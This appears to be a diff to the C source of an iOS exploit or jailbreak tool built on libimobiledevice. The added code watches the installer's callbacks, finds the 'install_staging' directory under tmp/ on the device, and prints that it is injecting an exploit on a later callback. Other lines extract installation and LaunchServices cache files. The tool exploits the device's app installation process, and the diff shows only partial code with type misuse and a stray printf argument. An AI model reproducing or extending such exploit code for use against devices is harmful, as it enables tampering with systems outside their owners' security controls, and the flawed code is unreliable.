@@ -25,6 +25,10 @@ unsigned int cb = 0;
 unsigned int installError = 0;
 unsigned int installing = 1;
 
+char **list = NULL;
+char *tmpDir[100];
+char *stagingString = "install_staging";
+
 idevice_t gDevice = NULL;
 afc_client_t gAfc = NULL;
 lockdownd_client_t gLockdown = NULL;
@@ -283,6 +287,22 @@ afc_error_t afc_receive_file(afc_client_t afc, const char* remote,
 
 void minst_cb(const char *operation, plist_t status, void *unused) {
 	cb++;
+	if (cb == 1) {
+		afc_read_directory(gAfc, "tmp/", &list);
+		if (list) {
+			while (list[0]) {
+					if (strcmp(list[0], ".") && strcmp(list[0], "..")) {
+						if (strncmp(stagingString, list[0], 7) == 0) {
+							strcpy(tmpDir, "tmp/");
+							printf(" [*] Found staging directory: %s\n", list[0]);
+							stagingString = list[0];
+							strcat(tmpDir, stagingString);
+						}
+					}
+					list++;
+			}
+		}
+	}
 	if (cb == 8) {
 		printf(" [*] Injection vector found - ", cb);
 		printf("Injecting exploit...\n");
@@ -632,13 +652,14 @@ int main(int argc, char *argv[]) {
 	}
 	printf("\n");
 	fclose(f);
-	printf("%s [*] Total size received: %d\n\n %s", KGRN,cnt, KNRM);
+	printf("%s [*] Total size received: %d\n\n%s", KGRN,cnt, KNRM);
 	
 	
 	//unpacking caches
 	
 	system("mkdir resources/extracted > /dev/null");
-	system("tar -C resources/extracted -xvf resources/caches.cpio.gz > /dev/null");
+	printf(" [*] Extracting files\n");
+	system("tar -C resources/extracted -xvf resources/caches.cpio.gz &> /dev/null");
 	system("mv resources/extracted/var/mobile/Library/Caches/com.apple.mobile.installation.plist resources/");
 	system("mv resources/extracted/var/mobile/Library/Caches/com.apple.LaunchServices-055.csstore resources/");
 	
